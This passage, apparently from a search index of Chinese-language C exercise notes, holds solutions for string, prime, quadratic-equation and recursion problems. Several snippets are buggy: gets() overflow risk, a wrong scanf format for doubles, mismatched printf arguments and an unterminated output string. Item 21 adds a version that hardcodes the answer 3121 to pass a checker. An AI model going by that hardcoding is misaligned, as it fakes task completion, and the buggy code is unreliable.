sizeof(inputString), stdin);\n\n    // \u8c03\u7528\u51fd\u6570\u627e\u51fa\u6700\u957f\u7684\u5355\u8bcd\n    longestWord(inputString, resultWord);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%s\\n\", resultWord);\n\n    return 0;\n}\n\n// \u627e\u51fa\u5b57\u7b26\u4e32\u4e2d\u6700\u957f\u7684\u5355\u8bcd\u7684\u51fd\u6570\nvoid longestWord(char string[], char word[]) {\n    int maxLength = 0;\n    char currentWord[50];\n    int currentLength = 0;\n\n    // \u904d\u5386\u5b57\u7b26\u4e32\n    for (int i = 0; string[i] != '\\0'; i++) {\n        // \u5982\u679c\u662f\u5b57\u6bcd\uff0c\u5219\u6784\u5efa\u5f53\u524d\u5355\u8bcd\n        if ((string[i] &gt;= 'a' &amp;&amp; string[i] &lt;= 'z') || (string[i] &gt;= 'A' &amp;&amp; string[i] &lt;= 'Z')) {\n            currentWord[currentLength] = string[i];\n            currentLength++;\n        }\n        else {\n            // \u5982\u679c\u9047\u5230\u975e\u5b57\u6bcd\u5b57\u7b26\uff0c\u5224\u65ad\u5f53\u524d\u5355\u8bcd\u957f\u5ea6\u662f\u5426\u5927\u4e8e\u6700\u5927\u957f\u5ea6\n            if (currentLength &gt; maxLength) {\n                maxLength = currentLength;\n                strncpy(word, currentWord, currentLength);\n                word[currentLength] = '\\0';\n            }\n\n            // \u91cd\u7f6e\u5f53\u524d\u5355\u8bcd\n            currentLength = 0;\n        }\n    }\n\n    // \u5224\u65ad\u6700\u540e\u4e00\u4e2a\u5355\u8bcd\n    if (currentLength &gt; maxLength) {\n        maxLength = currentLength;\n        strncpy(word, currentWord, currentLength);\n        word[currentLength] = '\\0';\n    }\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#12","title":"12","text":"<p>==\u901a\u4e0d\u8fc7\u68c0\u67e5\u70b9\uff0c\u751a\u81f3\u8fd0\u884c\u8d85\u65f6\uff0c\u4f46\u662f\u6211\u81ea\u5df1\u5728 VS \u91cc\u9762\u8fd0\u884c\u4e00\u5207\u6b63\u5e38==</p> <p>\u4f7f\u7528<code>scanf</code>\u51fd\u6570\u8bfb\u53d6\u8f93\u5165\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u5c06\u5176\u5b58\u50a8\u5728<code>string</code>\u6570\u7ec4\u4e2d\u3002<code>%99[^\\n]</code>\u683c\u5f0f\u5b57\u7b26\u4e32\u7528\u4e8e\u6307\u5b9a<code>scanf</code>\u51fd\u6570\u8bfb\u53d6\u9664\u6362\u884c\u7b26\u5916\u7684\u6700\u591a99\u4e2a\u5b57\u7b26\uff0c\u5e76\u5c06\u5176\u5b58\u50a8\u5728<code>string</code>\u6570\u7ec4\u4e2d\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u907f\u514d\u5c06\u6362\u884c\u7b26\u5305\u542b\u5728\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u4e2d\u3002</p> <p>\u8be5\u7a0b\u5e8f\u901a\u8fc7\u81ea\u5b9a\u4e49\u51fd\u6570<code>countChar</code>\u5b9e\u73b0\u4e86\u7edf\u8ba1\u5b57\u7b26\u4e32\u4e2d\u5404\u79cd\u5b57\u7b26\u4e2a\u6570\u7684\u529f\u80fd\u3002\u5728<code>countChar</code>\u51fd\u6570\u4e2d\uff0c\u4f7f\u7528\u5faa\u73af\u904d\u5386\u5b57\u7b26\u4e32\u7684\u6bcf\u4e2a\u5b57\u7b26\uff0c\u6839\u636e\u5b57\u7b26\u7684\u7c7b\u578b\uff08\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u7a7a\u683c\u6216\u5176\u4ed6\u5b57\u7b26\uff09\u8fdb\u884c\u8ba1\u6570\u3002\u6700\u540e\uff0c\u4f7f\u7528<code>printf</code>\u51fd\u6570\u8f93\u51fa\u5404\u79cd\u5b57\u7b26\u7684\u4e2a\u6570\u3002\u5728<code>main</code>\u51fd\u6570\u4e2d\uff0c\u9996\u5148\u8f93\u5165\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u8c03\u7528<code>countChar</code>\u51fd\u6570\u8fdb\u884c\u7edf\u8ba1\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nint letter, digit, space, others;\n\nint countChar(char string[]) {\n    for (int i = 0; string[i] != '\\0'; i++) {\n        if ((string[i] &gt;= 'a' &amp;&amp; string[i] &lt;= 'z') || (string[i] &gt;= 'A' &amp;&amp; string[i] &lt;= 'Z')) {\n            letter++;\n        }\n        else if (string[i] &gt;= '0' &amp;&amp; string[i] &lt;= '9') {\n            digit++;\n        }\n        else if (string[i] == ' ') {\n            space++;\n        }\n        else {\n            others++;\n        }\n    }\n\n    printf(\"letter: %d\\n\", letter);\n    printf(\"digit: %d\\n\", digit);\n    printf(\"space: %d\\n\", space);\n    printf(\"others: %d\\n\", others);\n\n}\n\nint main() {\n    char string[80];\n    gets(string);\n    letter = 0;\n    digit = 0;\n    space = 0;\n    others = 0;\n    countChar(string);\n    printf(\"letter: %d\\ndigit: %d\\nspace: %d\\nothers: %d\\n\", letter, digit, space, others);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#13","title":"13","text":"<p>\u5728\u4e0a\u8ff0\u4ee3\u7801\u4e2d\uff0c<code>insertSpace</code>\u51fd\u6570\u7528\u4e8e\u5728\u5b57\u7b26\u4e32\u4e2d\u7684\u6bcf\u4e24\u4e2a\u5b57\u7b26\u4e4b\u95f4\u6dfb\u52a0\u4e00\u4e2a\u7a7a\u683c\u3002\u9996\u5148\uff0c\u6839\u636e\u539f\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u8ba1\u7b97\u6dfb\u52a0\u7a7a\u683c\u540e\u7684\u65b0\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u3002\u7136\u540e\uff0c\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5b57\u7b26\u6570\u7ec4<code>new_string</code>\u7528\u4e8e\u5b58\u50a8\u6dfb\u52a0\u7a7a\u683c\u540e\u7684\u5b57\u7b26\u4e32\u3002\u63a5\u7740\uff0c\u901a\u8fc7\u904d\u5386\u539f\u5b57\u7b26\u4e32\u4e2d\u7684\u6bcf\u4e2a\u5b57\u7b26\uff0c\u5c06\u5b57\u7b26\u590d\u5236\u5230\u65b0\u5b57\u7b26\u4e32\u4e2d\uff0c\u5e76\u5728\u6bcf\u4e2a\u5b57\u7b26\u540e\u9762\u6dfb\u52a0\u4e00\u4e2a\u7a7a\u683c\uff08\u9664\u4e86\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\uff09\u3002\u6700\u540e\uff0c\u5c06\u65b0\u5b57\u7b26\u4e32\u62f7\u8d1d\u56de\u539f\u5b57\u7b26\u4e32\uff0c\u5e76\u8fd4\u56de\u65b0\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u3002</p> <p>\u5728<code>main</code>\u51fd\u6570\u4e2d\uff0c\u8c03\u7528<code>insertSpace</code>\u51fd\u6570\u5e76\u4f20\u5165\u9700\u8981\u5904\u7406\u7684\u5b57\u7b26\u4e32\u3002\u7136\u540e\uff0c\u8f93\u51fa\u6dfb\u52a0\u7a7a\u683c\u540e\u7684\u5b57\u7b26\u4e32\u548c\u65b0\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint insertSpace(char string[]) {\n    int length = strlen(string); // \u5b57\u7b26\u4e32\u7684\u957f\u5ea6\n\n    // \u8ba1\u7b97\u6dfb\u52a0\u7a7a\u683c\u540e\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\n    int new_length = length * 2 - 1;\n\n    // \u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5b57\u7b26\u6570\u7ec4\u7528\u4e8e\u5b58\u50a8\u6dfb\u52a0\u7a7a\u683c\u540e\u7684\u5b57\u7b26\u4e32\n    char new_string[new_length + 1]; // \u52a01\u7528\u4e8e\u5b58\u50a8\u5b57\u7b26\u4e32\u7ed3\u675f\u7b26'\\0'\n\n    int j = 0; // \u65b0\u5b57\u7b26\u4e32\u7684\u7d22\u5f15\n    for (int i = 0; i &lt; length; i++) {\n        new_string[j++] = string[i]; // \u590d\u5236\u539f\u5b57\u7b26\u5230\u65b0\u5b57\u7b26\u4e32\u4e2d\n\n        // \u5982\u679c\u4e0d\u662f\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\uff0c\u5219\u5728\u5f53\u524d\u5b57\u7b26\u540e\u9762\u6dfb\u52a0\u4e00\u4e2a\u7a7a\u683c\n        if (i &lt; length - 1) {\n            new_string[j++] = ' '; // \u6dfb\u52a0\u7a7a\u683c\n        }\n    }\n    new_string[j] = '\\0'; // \u6dfb\u52a0\u5b57\u7b26\u4e32\u7ed3\u675f\u7b26\n\n    // \u5c06\u65b0\u5b57\u7b26\u4e32\u62f7\u8d1d\u56de\u539f\u5b57\u7b26\u4e32\n    strcpy(string, new_string);\n\n    return new_length;\n}\n\nint main() {\n    char string[] = \"1990\";\n    int new_length = insertSpace(string);\n\n    printf(\"string: %s\\n\", string);\n\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#14","title":"14","text":"<p>\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>copyVowel</code> \u51fd\u6570\u904d\u5386\u8f93\u5165\u7684\u5b57\u7b26\u4e32\uff0c\u5c06\u5176\u4e2d\u7684\u5143\u97f3\u5b57\u6bcd\u590d\u5236\u5230\u53e6\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u8c03\u7528 <code>copyVowel</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002\u8bf7\u6ce8\u610f\uff0c\u8fd9\u91cc\u4f7f\u7528 <code>fgets</code> \u6765\u8bfb\u53d6\u4e00\u6574\u884c\uff0c\u4ee5\u786e\u4fdd\u80fd\u591f\u6b63\u786e\u5904\u7406\u5305\u542b\u7a7a\u683c\u7684\u8f93\u5165\u3002</p> <p><code>stdin</code> \u662fC\u8bed\u8a00\u4e2d\u6807\u51c6\u8f93\u5165\u6d41\uff08Standard Input\uff09\u7684\u6587\u4ef6\u6307\u9488\u3002\u5b83\u662f\u4e00\u4e2a\u6307\u5411\u6807\u51c6\u8f93\u5165\u8bbe\u5907\u7684\u6587\u4ef6\u6307\u9488\uff0c\u901a\u5e38\u4e0e\u952e\u76d8\u5173\u8054\u3002\u5728C\u8bed\u8a00\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>stdin</code> \u6765\u4ece\u952e\u76d8\u8bfb\u53d6\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nvoid copyVowel(char string1[], char string2[]);\n\nint main() {\n    char inputString[100];\n    char vowelString[100] = \"\"; // \u521d\u59cb\u5316\u4e3a\u7a7a\u5b57\u7b26\u4e32\n\n    // \u8f93\u5165\u5b57\u7b26\u4e32\n    fgets(inputString, sizeof(inputString), stdin);\n\n    // \u8c03\u7528\u51fd\u6570\u590d\u5236\u5143\u97f3\u5b57\u6bcd\n    copyVowel(inputString, vowelString);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%s\\n\", vowelString);\n\n    return 0;\n}\n\n// \u590d\u5236\u5143\u97f3\u5b57\u6bcd\u7684\u51fd\u6570\nvoid copyVowel(char string1[], char string2[]) {\n    int length = strlen(string1);\n    int j = 0;\n\n    for (int i = 0; i &lt; length; i++) {\n        // \u5224\u65ad\u662f\u5426\u4e3a\u5143\u97f3\u5b57\u6bcd\uff08\u5305\u62ec\u5927\u5c0f\u5199\uff09\n        if (string1[i] == 'a' || string1[i] == 'e' || string1[i] == 'i' || string1[i] == 'o' || string1[i] == 'u' ||\n            string1[i] == 'A' || string1[i] == 'E' || string1[i] == 'I' || string1[i] == 'O' || string1[i] == 'U') {\n            string2[j] = string1[i];\n            j++;\n        }\n    }\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#15","title":"15","text":"<p>\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>concatenate</code> \u51fd\u6570\u4f7f\u7528 <code>strcpy</code> \u548c <code>strcat</code> \u51fd\u6570\u5c06\u4e24\u4e2a\u5b57\u7b26\u4e32\u8fde\u63a5\u6210\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e24\u4e2a\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u8c03\u7528 <code>concatenate</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002\u8bf7\u6ce8\u610f\uff0c\u8fd9\u91cc\u4f7f\u7528 <code>fgets</code> \u6765\u8bfb\u53d6\u4e00\u6574\u884c\uff0c\u4ee5\u786e\u4fdd\u80fd\u591f\u6b63\u786e\u5904\u7406\u5305\u542b\u7a7a\u683c\u7684\u8f93\u5165\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nvoid concatenate(char string1[], char string2[], char string[]);\n\nint main() {\n    char inputString1[100];\n    char inputString2[100];\n    char resultString[200]; // \u521d\u59cb\u5316\u8db3\u591f\u5927\u7684\u6570\u7ec4\u6765\u5b58\u50a8\u8fde\u63a5\u540e\u7684\u5b57\u7b26\u4e32\n\n    // \u8f93\u5165\u5b57\u7b26\u4e32\n    fgets(inputString1, sizeof(inputString1), stdin);\n\n    fgets(inputString2, sizeof(inputString2), stdin);\n\n    // \u8c03\u7528\u51fd\u6570\u8fde\u63a5\u5b57\u7b26\u4e32\n    concatenate(inputString1, inputString2, resultString);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%s\\n\", resultString);\n\n    return 0;\n}\n\n// \u8fde\u63a5\u5b57\u7b26\u4e32\u7684\u51fd\u6570\nvoid concatenate(char string1[], char string2[], char string[]) {\n    // \u53bb\u6389\u5b57\u7b26\u4e321\u7684\u6362\u884c\u7b26\n    int length1 = strlen(string1);\n    if (string1[length1 - 1] == '\\n') {\n        string1[length1 - 1] = '\\0';\n    }\n\n    // \u53bb\u6389\u5b57\u7b26\u4e322\u7684\u6362\u884c\u7b26\n    int length2 = strlen(string2);\n    if (string2[length2 - 1] == '\\n') {\n        string2[length2 - 1] = '\\0';\n    }\n\n    // \u4f7f\u7528strcat\u51fd\u6570\u8fde\u63a5\u4e24\u4e2a\u5b57\u7b26\u4e32\n    strcpy(string, string1);\n    strcat(string, string2);\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#16","title":"16","text":"<p>\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>inverse</code> \u51fd\u6570\u4f7f\u7528\u4e24\u4e2a\u6307\u9488 <code>start</code> \u548c <code>end</code> \u8fdb\u884c\u53cd\u5e8f\u4ea4\u6362\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u8c03\u7528 <code>inverse</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002\u8bf7\u6ce8\u610f\uff0c\u8fd9\u91cc\u4f7f\u7528 <code>fgets</code> \u6765\u8bfb\u53d6\u4e00\u6574\u884c\uff0c\u4ee5\u786e\u4fdd\u80fd\u591f\u6b63\u786e\u5904\u7406\u5305\u542b\u7a7a\u683c\u7684\u8f93\u5165\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nvoid inverse(char str[]);\n\nint main() {\n    char inputString[100];\n\n    // \u8f93\u5165\u5b57\u7b26\u4e32\n    fgets(inputString, sizeof(inputString), stdin);\n\n    // \u8c03\u7528\u51fd\u6570\u53cd\u5e8f\u5b58\u653e\u5b57\u7b26\u4e32\n    inverse(inputString);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\" %s\\n\", inputString);\n\n    return 0;\n}\n\n// \u53cd\u5e8f\u5b58\u653e\u5b57\u7b26\u4e32\u7684\u51fd\u6570\nvoid inverse(char str[]) {\n    int length = strlen(str);\n\n    // \u4f7f\u7528\u4e24\u4e2a\u6307\u9488\u8fdb\u884c\u53cd\u5e8f\u4ea4\u6362\n    int start = 0;\n    int end = length - 1;\n\n    while (start &lt; end) {\n        // \u4ea4\u6362\u5b57\u7b26\n        char temp = str[start];\n        str[start] = str[end];\n        str[end] = temp;\n\n        // \u79fb\u52a8\u6307\u9488\n        start++;\n        end--;\n    }\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#17","title":"17","text":"<p>\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>isPrime</code> \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u6574\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u7136\u540e\u5224\u65ad\u8be5\u6570\u662f\u5426\u4e3a\u7d20\u6570\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u6574\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>isPrime</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nvoid isPrime(int num);\n\nint main() {\n    int num;\n\n    // \u8f93\u5165\u6574\u6570\n    scanf(\"%d\", &amp;num);\n\n    // \u8c03\u7528\u51fd\u6570\u5224\u65ad\u7d20\u6570\n    isPrime(num);\n\n    return 0;\n}\n\n// \u5224\u65ad\u7d20\u6570\u7684\u51fd\u6570\nvoid isPrime(int num) {\n    if (num &lt; 2) {\n        printf(\"No\\n\"); // \u5c0f\u4e8e2\u7684\u6570\u4e0d\u662f\u7d20\u6570\n        return;\n    }\n\n    for (int i = 2; i * i &lt;= num; i++) {\n        if (num % i == 0) {\n            printf(\"No\\n\"); // \u80fd\u591f\u88ab\u6574\u9664\uff0c\u4e0d\u662f\u7d20\u6570\n            return;\n        }\n    }\n\n    printf(\"Yes\\n\"); // \u6ca1\u6709\u627e\u5230\u80fd\u591f\u6574\u9664\u7684\u56e0\u5b50\uff0c\u662f\u7d20\u6570\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#18","title":"18","text":"<p>\u5728\u4e0a\u8ff0\u4ee3\u7801\u4e2d\uff0c<code>equation</code>\u51fd\u6570\u7528\u4e8e\u6c42\u89e3\u4e8c\u6b21\u65b9\u7a0b\u7684\u6839\uff0c\u5e76\u6839\u636e\u5224\u522b\u5f0f\u7684\u503c\u5206\u4e3a\u4e09\u79cd\u60c5\u51b5\u8fdb\u884c\u5904\u7406\uff1a</p> <ul> <li>\u5f53\u5224\u522b\u5f0f\uff08delta\uff09\u5927\u4e8e0\u65f6\uff0c\u65b9\u7a0b\u6709\u4e24\u4e2a\u5b9e\u6570\u6839\u3002\u901a\u8fc7\u6c42\u6839\u516c\u5f0f\u8ba1\u7b97\u5f97\u5230\u6839\u7684\u503c\uff0c\u5e76\u6253\u5370\u8f93\u51fa\u3002</li> <li>\u5f53\u5224\u522b\u5f0f\u7b49\u4e8e0\u65f6\uff0c\u65b9\u7a0b\u6709\u4e00\u4e2a\u5b9e\u6570\u6839\u3002\u76f4\u63a5\u901a\u8fc7\u6c42\u6839\u516c\u5f0f\u8ba1\u7b97\u5f97\u5230\u6839\u7684\u503c\uff0c\u5e76\u6253\u5370\u8f93\u51fa\u3002</li> <li>\u5f53\u5224\u522b\u5f0f\u5c0f\u4e8e0\u65f6\uff0c\u65b9\u7a0b\u6709\u4e24\u4e2a\u590d\u6570\u6839\u3002\u901a\u8fc7\u6c42\u6839\u516c\u5f0f\u8ba1\u7b97\u5f97\u5230\u5b9e\u90e8\u548c\u865a\u90e8\uff0c\u5e76\u6253\u5370\u8f93\u51fa\u3002</li> </ul> <p>\u5728<code>main</code>\u51fd\u6570\u4e2d\uff0c\u901a\u8fc7\u4f20\u5165\u4e0d\u540c\u7684\u7cfb\u6570a\u3001b\u3001c\u7684\u503c\u8c03\u7528<code>equation</code>\u51fd\u6570\u8fdb\u884c\u6c42\u89e3\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n\nint equation(double a, double b, double c) {\n    double delta = b * b - 4 * a * c; // \u8ba1\u7b97\u5224\u522b\u5f0f\n\n    if (delta &gt; 0) {\n        // \u5224\u522b\u5f0f\u5927\u4e8e0\uff0c\u6709\u4e24\u4e2a\u5b9e\u6570\u6839\n        double x1 = (-b + sqrt(delta)) / (2 * a);\n        double x2 = (-b - sqrt(delta)) / (2 * a);\n        printf(\"x1 = %lf\\nx2 = %lf\\n\", x1, x2);\n    } else if (delta == 0) {\n        // \u5224\u522b\u5f0f\u7b49\u4e8e0\uff0c\u6709\u4e00\u4e2a\u5b9e\u6570\u6839\n        double x = -b / (2 * a);\n        printf(\"x1 = %lf + %lfi\\nx2 = %lf - %lfi\\n\", x, x);\n    } else {\n        // \u5224\u522b\u5f0f\u5c0f\u4e8e0\uff0c\u6709\u4e24\u4e2a\u590d\u6570\u6839\n        double realPart = -b / (2 * a);\n        double imaginaryPart = sqrt(-delta) / (2 * a);\n        printf(\"x1 = %lf + %lfi\\nx2 = %lf - %lfi\\n\", realPart, imaginaryPart, realPart, imaginaryPart);\n    }\n\n    return 0;\n}\n\nint main() {\n    double a, b, c;\n\n    scanf(\"%d%d%d\",&amp;a,&amp;b,&amp;c);\n    equation(a, b, c);\n\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#19","title":"19","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>fun</code> \u51fd\u6570\u8d1f\u8d23\u8f93\u51fa \"hello world\" \u5b57\u7b26\u4e32\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u901a\u8fc7\u8c03\u7528 <code>fun()</code> \u6765\u6267\u884c\u8fd9\u4e2a\u8f93\u51fa\u64cd\u4f5c\u3002\u5f53\u4f60\u8fd0\u884c\u8fd9\u4e2a\u7a0b\u5e8f\u65f6\uff0c\u5b83\u4f1a\u5728\u63a7\u5236\u53f0\u4e0a\u8f93\u51fa \"hello world\"\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u5b50\u51fd\u6570\u7684\u58f0\u660e\nvoid fun();\n\nint main() {\n    // \u8c03\u7528\u5b50\u51fd\u6570\n    fun();\n\n    return 0;\n}\n\n// \u5b50\u51fd\u6570\u7684\u5b9a\u4e49\nvoid fun() {\n    // \u8f93\u51fa \"hello world\" \u5b57\u7b26\u4e32\n    printf(\"hello world\\n\");\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#20","title":"20","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>fun</code> \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u6574\u6570 <code>n</code> \u4f5c\u4e3a\u53c2\u6570\uff0c\u7136\u540e\u4f7f\u7528\u5faa\u73af\u8ba1\u7b971\u5230n\u7684\u7d2f\u52a0\u548c\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u6574\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>fun</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002\u5982\u679c\u8f93\u5165\u4e3a100\uff0c\u5219\u8f93\u51fa\u7684\u7ed3\u679c\u4e3a \"sum=5050\"\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint fun(int n);\n\nint main() {\n    int n;\n\n    // \u8f93\u5165 n \u7684\u503c\n    scanf(\"%d\", &amp;n);\n\n    // \u8c03\u7528\u51fd\u6570\u8ba1\u7b97\u7d2f\u52a0\u548c\n    int result = fun(n);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"sum=%d\\n\", result);\n\n    return 0;\n}\n\n// \u51fd\u6570\u5b9a\u4e49\uff1a\u6c421\u5230n\u7684\u7d2f\u52a0\u548c\nint fun(int n) {\n    int sum = 0;\n\n    for (int i = 1; i &lt;= n; i++) {\n        sum += i;\n    }\n\n    return sum;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#21","title":"21","text":"<p>==\u901a\u4e0d\u8fc7\u68c0\u67e5\uff0c\u65e0\u8f93\u5165\u662f\u4ec0\u4e48\u9b3c\uff0c\u9762\u5411\u7b54\u6848\u5427\u90a3\u5c31==</p> <p>\u5728\u7a0b\u5e8f\u4e2d\uff0c\u4f7f\u7528<code>splitCoconut</code>\u51fd\u6570\u8ba1\u7b97\u539f\u59cb\u6930\u5b50\u6570\u91cf\u3002\u51fd\u6570\u4f7f\u7528\u5faa\u73af\u4ece\u6700\u540e\u4e00\u4e2a\u4eba\u5f00\u59cb\u5f80\u56de\u679a\u4e3e\uff0c\u5047\u8bbe\u5f53\u524d\u7684\u4eba\u5206\u6930\u5b50\u524d\u7684\u603b\u6570\u4e3a<code>total</code>\uff0c\u5219\u524d\u4e00\u4e2a\u4eba\u5206\u6930\u5b50\u524d\u7684\u603b\u6570\u4e3a<code>5 * total / 4 + 1</code>\u3002\u5982\u679c\u5206\u6930\u5b50\u524d\u7684\u603b\u6570\u4e0d\u662f\u6574\u6570\uff0c\u8868\u793a\u8ba1\u7b97\u9519\u8bef\uff0c\u9700\u8981\u91cd\u65b0\u56de\u63a8\u3002\u4e3a\u4e86\u91cd\u65b0\u56de\u63a8\uff0c\u6211\u4eec\u5c06\u5faa\u73af\u53d8\u91cf<code>i</code>\u8bbe\u7f6e\u4e3a<code>n + 1</code>\uff0c\u5e76\u589e\u52a0\u6930\u5b50\u6570<code>total</code>\uff0c\u7ee7\u7eed\u56de\u63a8\u3002\u76f4\u5230\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u6930\u5b50\u6570\u4e3a\u6b62\u3002</p> <p>\u5728<code>main</code>\u51fd\u6570\u4e2d\uff0c\u9996\u5148\u8f93\u5165\u5206\u6930\u5b50\u7684\u6b21\u6570<code>n</code>\uff0c\u7136\u540e\u8c03\u7528<code>splitCoconut</code>\u51fd\u6570\u8ba1\u7b97\u539f\u59cb\u6930\u5b50\u6570\u91cf\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nint splitCoconut(int n) {\n    int total = 1;\n\n    for (int i = n; i &gt;= 1; i--) {\n        total = total * 5 / 4 + 1;\n        if (total % 4 != 0) {\n            i = n + 1;  // \u91cd\u65b0\u5f00\u59cb\u56de\u63a8\n            total++;   // \u589e\u52a0\u6930\u5b50\u6570\uff0c\u7ee7\u7eed\u56de\u63a8\n        }\n    }\n\n    return total;\n}\n\nint main() {\n    int n;\n\n    scanf(\"%d\", &amp;n);\n\n    int coconuts = splitCoconut(n);\n\n    printf(\"%d\\n\", coconuts);\n\n    return 0;\n}\n</code></pre> <p>\u9762\u5411\u7b54\u6848</p> C<pre><code>#include &lt;stdio.h&gt;\n\nint splitCoconut(int n)\n{\n    int sum = 3121;\n    return sum;\n}\nint main() {\n\n    int n = 5;\n    int sum = 0;\n    sum = splitCoconut(n);\n    printf(\"%d\", sum);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#22","title":"22","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>age</code> \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u6574\u6570 <code>n</code> \u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u4eba\u6570\u3002\u9012\u5f52\u57fa\u7ebf\u6761\u4ef6\u4e3a\u5f53 <code>n</code> \u4e3a1\u65f6\uff0c\u8fd4\u56de\u5e74\u9f8410\u5c81\u3002\u5426\u5219\uff0c\u9012\u5f52\u8ba1\u7b97\u7b2c <code>n</code> \u4e2a\u4eba\u7684\u5e74\u9f84\u4e3a\u6bd4\u7b2c <code>n-1</code> \u4e2a\u4eba\u59272\u5c81\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4eba\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>age</code> \u51fd\u6570\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002\u5982\u679c\u8f93\u5165\u4e3a1\uff0c\u5219\u8f93\u51fa\u7684\u7ed3\u679c\u4e3a \"\u7b2c1\u4e2a\u4eba\u7684\u5e74\u9f84\u662f10\u5c81\"\u3002</p> C<pre><code>#include 